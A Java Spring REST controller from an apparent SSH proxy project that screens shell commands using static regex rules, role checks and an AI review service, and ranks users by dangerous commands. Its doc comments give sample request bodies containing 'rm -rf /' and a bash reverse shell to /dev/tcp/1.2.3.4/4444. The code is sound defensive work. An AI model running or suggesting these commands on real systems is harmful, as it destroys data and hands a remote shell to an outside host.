package com.zhanghan.sshproxyproject.controller;

import com.zhanghan.sshproxyproject.common.utils.PermissionUtil;
import com.zhanghan.sshproxyproject.core.review.StaticRuleEngine;
import com.zhanghan.sshproxyproject.dto.Result;
import com.zhanghan.sshproxyproject.entity.*;
import com.zhanghan.sshproxyproject.mapper.AuditLogMapper;
import com.zhanghan.sshproxyproject.service.DeepSeekService;
import com.zhanghan.sshproxyproject.service.RecommendationService;
import io.swagger.v3.oas.annotations.Operation;
import io.swagger.v3.oas.annotations.tags.Tag;
import jakarta.annotation.Resource;
import lombok.extern.slf4j.Slf4j;
import org.springframework.web.bind.annotation.*;

import java.util.*;

/**
 * AI 风险分析控制器
 * <p>
 * 提供命令审查、危险排名、策略推荐等 REST 接口
 */
@Tag(name = "AI 风险分析", description = "命令审查 / 危险排名 / 策略推荐")
@RestController
@Slf4j
@RequestMapping("/ai")
public class AIRiskController {

    @Resource
    private AuditLogMapper auditLogMapper;

    @Resource
    private DeepSeekService deepSeekService;

    @Resource
    private StaticRuleEngine staticRuleEngine;            // 静态规则引擎（新增）

    @Resource
    private RecommendationService recommendationService;  // AI 策略建议（新增）

    /**
     * 命令风险分析（静态规则 + AI 审查）
     *
     * <pre>
     * POST /api/ai/analyze
     * Body: { "command": "rm -rf /", "username": "guest", "role": "guest" }
     * </pre>
     *
     *
     * 静态规则引擎使用正则匹配（非旧版子串匹配），AI 审查同步执行。
     */
    @Operation(summary = "命令风险分析", description = "静态规则 + AI 审查综合判定")
    @PostMapping("/analyze")
    public Result analyzeCommand(@RequestBody Map<String, String> body) {
        String command = body.get("command");
        String username = body.getOrDefault("username", "unknown");
        String role = body.getOrDefault("role", "guest");

        // ---- 参数校验 ----
        if (command == null || command.isBlank()) {
            return Result.fail("命令不能为空");
        }

        // ---- 构造用户对象 ----
        User checkUser = new User();
        checkUser.setUsername(username);
        checkUser.setRole(role);

        // ---- Phase 1: 静态审查（使用新正则引擎） ----
        StaticReviewResult staticResult = staticRuleEngine.review(command);
        boolean rolePermitted = PermissionUtil.checkUserPermission(checkUser, command);

        // ---- Phase 2: AI 审查（同步调用，REST API 场景可接受延迟） ----
        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);

        // ---- 综合判定 ----
        // 静态规则 BLOCK OR 角色权限不足 OR AI 判定 HIGH → 拦截
        boolean staticBlocked = staticResult.getVerdict() == ReviewVerdict.BLOCK;
        boolean finalBlocked = staticBlocked
                || !rolePermitted
                || (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()));

        // ---- 组装返回 ----
        Map<String, Object> result = new LinkedHashMap<>();
        result.put("command", command);
        result.put("username", username);
        result.put("role", role);
        result.put("blocked", finalBlocked);

        // 静态分析结果
        Map<String, Object> staticAnalysis = new LinkedHashMap<>();
        staticAnalysis.put("permitted", rolePermitted);
        staticAnalysis.put("verdict", staticResult.getVerdict().name());
        staticAnalysis.put("matchedRule", staticResult.getMatchedRule());
        staticAnalysis.put("reason", staticResult.getReason());
        staticAnalysis.put("matchedBlacklist", staticBlocked);  // 兼容旧字段
        result.put("staticAnalysis", staticAnalysis);

        // AI 分析结果
        Map<String, Object> aiAnalysis = new LinkedHashMap<>();
        aiAnalysis.put("dangerous", aiResult.isDangerous());
        aiAnalysis.put("level", aiResult.getLevel());
        aiAnalysis.put("reason", aiResult.getReason());
        aiAnalysis.put("category", aiResult.getCategory());
        result.put("aiAnalysis", aiAnalysis);

        // 拦截原因
        List<String> blockReasons = new ArrayList<>();
        if (staticBlocked) blockReasons.add("静态规则拦截: " + staticResult.getMatchedRule());
        if (!rolePermitted) blockReasons.add("角色权限不足");
        if (aiResult.isDangerous() && "HIGH".equals(aiResult.getLevel()))
            blockReasons.add("AI 审查判定高危: " + aiResult.getReason());
        result.put("blockReasons", blockReasons);

        log.info("命令审查完成: cmd={}, staticVerdict={}, permitted={}, aiLevel={}, finalBlocked={}",
                command, staticResult.getVerdict(), rolePermitted, aiResult.getLevel(), finalBlocked);

        return Result.ok(result);
    }

    /**
     * 危险命令用户排行榜
     */
    @Operation(summary = "危险命令用户排行榜")
    @GetMapping("/ranking")
    public Result getRanking() {
        List<Map<String, Object>> ranking = auditLogMapper.getDangerRanking();
        if (ranking == null) {
            ranking = new ArrayList<>();
        }

        // 转换格式
        List<Map<String, Object>> resultList = new ArrayList<>();
        for (Map<String, Object> row : ranking) {
            Map<String, Object> item = new HashMap<>();
            item.put("username", row.get("username"));
            Object countObj = row.get("danger_count");
            item.put("dangerCount", countObj != null ? Long.parseLong(countObj.toString()) : 0);
            resultList.add(item);
        }

        return Result.ok(resultList);
    }

    /**
     * AI 策略推荐（读取定时任务生成的缓存）
     * <p>
     * 建议由 {@code RecommendationTask} 每天 0 点异步生成并缓存，
     * 此处直接返回缓存内容，避免每次请求都调用 AI。
     */
    @Operation(summary = "AI 策略推荐", description = "返回定时任务生成的安全策略建议缓存")
    @GetMapping("/recommendations")
    public Result getRecommendations() {
        return Result.ok(recommendationService.getRecommendations());
    }

    /**
     * 单独测试 AI 审查（不做静态规则判定，纯看 AI 的判断）
     *
     * <pre>
     * POST /api/AI/check
     * Body: { "command": "bash -i >& /dev/tcp/1.2.3.4/4444 0>&1" }
     * </pre>
     */
    @Operation(summary = "单独测试 AI 审查", description = "不做静态规则判定，纯看 AI 判断")
    @PostMapping("/check")
    public Result checkByAiOnly(@RequestBody Map<String, String> body) {
        String command = body.get("command");
        String username = body.getOrDefault("username", "test-user");
        String role = body.getOrDefault("role", "guest");

        if (command == null || command.isBlank()) {
            return Result.fail("命令不能为空");
        }

        AiReviewResult aiResult = deepSeekService.reviewCommand(command, username, role);

        Map<String, Object> result = new LinkedHashMap<>();
        result.put("command", command);
        result.put("dangerous", aiResult.isDangerous());
        result.put("level", aiResult.getLevel());
        result.put("reason", aiResult.getReason());
        result.put("category", aiResult.getCategory());

        return Result.ok(result);
    }
}
